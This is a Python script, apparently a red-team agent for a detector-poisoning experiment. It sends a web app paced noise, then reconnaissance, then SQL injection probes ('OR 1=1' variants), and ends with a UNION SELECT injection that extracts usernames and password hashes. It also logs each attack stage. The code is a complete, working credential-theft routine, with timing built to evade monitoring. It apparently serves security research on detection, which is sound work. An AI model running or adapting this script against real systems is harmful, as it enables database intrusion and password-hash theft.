#!/usr/bin/env python3
"""Slow-rising red-team agent for RAMX calibrator poisoning experiments.

Phases (by elapsed fraction of total duration):
  0–35%  noise only (benign-looking path probes)
  35–60% recon searches only (no SQLi)
  60–85% mild SQLi probes (OR-based, not full UNION theft)
  85–100% full credential-theft kill chain

Sleep intervals lengthen early and shorten late to mimic low-and-slow → rush.
"""

from __future__ import annotations

import argparse
import json
import random
import re
import time
import uuid

import requests

CLASS_ID = "T1555_sqli_cred_theft"
STAGE_RECON = "recon"
STAGE_PROBE = "probe"
STAGE_EXPLOIT = "exploit"
STAGE_POST_EXPLOIT = "post_exploit"

_ROW_RE = re.compile(r"<li><b>(.*?)</b>: (.*?)</li>")
_HASH_RE = re.compile(r"^(scrypt|pbkdf2):")
_UNION_PAYLOAD = "' UNION SELECT username, password_hash FROM users -- "
_MILD_PAYLOADS = (
    "' OR '1'='1",
    "test' OR 1=1--",
    "admin'--",
    "' OR ''='",
)
_NOISE_PATHS = ("/", "/login", "/api/users", "/admin", "/search?q=hello", "/search?q=test")


def log_event(path: str, stage: str, success: bool, evidence: str, round_id: str, phase: str) -> None:
    row = {
        "class_id": CLASS_ID,
        "stage": stage,
        "success": success,
        "ts": time.time(),
        "evidence": evidence,
        "round_id": round_id,
        "phase": phase,
    }
    with open(path, "a", encoding="utf-8") as f:
        f.write(json.dumps(row) + "\n")
        f.flush()


def phase_for(elapsed: float, total: float) -> str:
    frac = elapsed / max(total, 1.0)
    if frac < 0.35:
        return "noise"
    if frac < 0.60:
        return "recon"
    if frac < 0.85:
        return "probe"
    return "strike"


def sleep_for_phase(phase: str) -> None:
    if phase == "noise":
        time.sleep(random.uniform(8.0, 18.0))
    elif phase == "recon":
        time.sleep(random.uniform(5.0, 12.0))
    elif phase == "probe":
        time.sleep(random.uniform(3.0, 8.0))
    else:
        time.sleep(random.uniform(1.5, 4.0))


def noise_probe(base: str, session: requests.Session) -> None:
    path = random.choice(_NOISE_PATHS)
    try:
        session.get(f"{base}{path}", timeout=5)
    except requests.RequestException:
        pass


def recon_only(base: str, session: requests.Session, events_path: str, round_id: str, phase: str) -> None:
    try:
        q = random.choice(["", "test", "admin", "users", "login"])
        r = session.get(f"{base}/search", params={"q": q}, timeout=5)
        ok = r.status_code == 200 and "search" in r.text.lower()
        log_event(events_path, STAGE_RECON, ok, f"status={r.status_code}", round_id, phase)
    except requests.RequestException as exc:
        log_event(events_path, STAGE_RECON, False, str(exc)[:120], round_id, phase)


def mild_probe(base: str, session: requests.Session, events_path: str, round_id: str, phase: str) -> None:
    payload = random.choice(_MILD_PAYLOADS)
    try:
        r = session.get(f"{base}/search", params={"q": payload}, timeout=5)
        ok = r.status_code == 200
        log_event(events_path, STAGE_PROBE, ok, f"payload={payload[:24]}", round_id, phase)
    except requests.RequestException as exc:
        log_event(events_path, STAGE_PROBE, False, str(exc)[:120], round_id, phase)


def full_strike(base: str, session: requests.Session, events_path: str, round_id: str, phase: str) -> bool:
    try:
        r = session.get(f"{base}/search", params={"q": ""}, timeout=5)
        recon_ok = r.status_code == 200 and "search" in r.text.lower()
    except requests.RequestException as exc:
        log_event(events_path, STAGE_RECON, False, str(exc)[:120], round_id, phase)
        return False
    log_event(events_path, STAGE_RECON, recon_ok, f"status={r.status_code}", round_id, phase)
    if not recon_ok:
        return False

    time.sleep(random.uniform(0.3, 1.2))
    try:
        r = session.get(f"{base}/search", params={"q": _UNION_PAYLOAD}, timeout=5)
        exploit_ok = r.status_code == 200
    except requests.RequestException as exc:
        log_event(events_path, STAGE_EXPLOIT, False, str(exc)[:120], round_id, phase)
        return False
    log_event(events_path, STAGE_EXPLOIT, exploit_ok, f"status={r.status_code}", round_id, phase)

    time.sleep(random.uniform(0.2, 0.8))
    rows = _ROW_RE.findall(r.text)
    creds = [(u, h) for u, h in rows if _HASH_RE.match(h)]
    success = len(creds) > 0
    log_event(events_path, STAGE_POST_EXPLOIT, success, f"count={len(creds)}", round_id, phase)
    return success


def main() -> int:
    p = argparse.ArgumentParser(description=__doc__)
    p.add_argument("--target-host", default="target-server")
    p.add_argument("--duration-sec", type=float, default=600.0)
    p.add_argument("--events", default="/events/redteam.jsonl")
    p.add_argument("--round-id", default="")
    args = p.parse_args()

    base = f"http://{args.target_host}"
    round_id = args.round_id or uuid.uuid4().hex[:12]
    events_path = args.events
    open(events_path, "w", encoding="utf-8").close()

    session = requests.Session()
    t0 = time.time()
    last_phase = ""
    while True:
        elapsed = time.time() - t0
        if elapsed >= args.duration_sec:
            break
        phase = phase_for(elapsed, args.duration_sec)
        if phase != last_phase:
            log_event(events_path, "phase_change", True, phase, round_id, phase)
            last_phase = phase

        if phase == "noise":
            if random.random() < 0.85:
                noise_probe(base, session)
        elif phase == "recon":
            if random.random() < 0.7:
                noise_probe(base, session)
            recon_only(base, session, events_path, round_id, phase)
        elif phase == "probe":
            if random.random() < 0.4:
                noise_probe(base, session)
            if random.random() < 0.6:
                recon_only(base, session, events_path, round_id, phase)
            mild_probe(base, session, events_path, round_id, phase)
        else:
            full_strike(base, session, events_path, round_id, phase)

        sleep_for_phase(phase)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
